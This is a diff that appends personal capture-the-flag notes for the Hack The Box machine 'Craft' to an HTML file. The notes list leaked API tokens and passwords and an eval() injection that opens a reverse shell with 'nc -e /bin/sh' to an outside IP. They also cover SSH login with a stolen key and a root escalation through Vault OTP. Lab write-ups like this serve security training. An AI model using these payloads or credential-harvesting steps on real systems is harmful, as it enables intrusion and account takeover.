@@ -39,3 +39,60 @@
             integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
     </body>
 </html>
+### USER.txt
+
+
+added added craft.htb api.craft.htb gogs.craft.htb to /etc/hosts
+
+found in gogs repo: issues:
+# curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
+
+
+found in commits: (https://gogs.craft.htb/Craft/craft-api/commit/a2d28ed1554adddfcfb845879bfea09f976ab7c1)
+# response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False
+
+using repo to get reverse: 
+abv parameter uses eval() for user input.
+eval(__import__('os').system('nc -e /bin/sh 10.10.12.142 4006') or 2 > 1)
+
+root in jail:
+in dbtest.py change fetchone() to fetchall() to see 'user' table
+
+from database:
+???:ebachman:llJ77D8QFkLPQB
+???:gilfoyle:ZEU3N8WNM2rh4T
+
+
+got id_rsa from gilfoyle's private repo on gogs:
+ssh -i id_rsa gilfoyle@10.10.10.110 
+passphrase:ZEU3N8WNM2rh4T
+
+### ROOT.txt
+
+in gilfoyle's private repo there is 'vault' dir and 'secrets.sh':
+vault secrets enable ssh
+vault write ssh/roles/root_otp \
+    key_type=otp \
+    default_user=root \
+    cidr_list=0.0.0.0/0
+
+vault can be opened using token in user's home dir:
+gilfoyle@craft:~$ vault login token=$(cat .vault-token)
+Success! You are now authenticated. 
+
+vault ssh root@localhost (you could run it just out of user's shell, no 'vault login' step needed)
+...
+a lot of text
+...
+OTP for the session is: 2a16b221-042a-bc4a-0c8f-0235c50d5481
+
+where OTP = one time password
+password: 2a16b221-042a-bc4a-0c8f-0235c50d5481
+
+
+got root:
+root@craft:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@craft:~# 
+
+
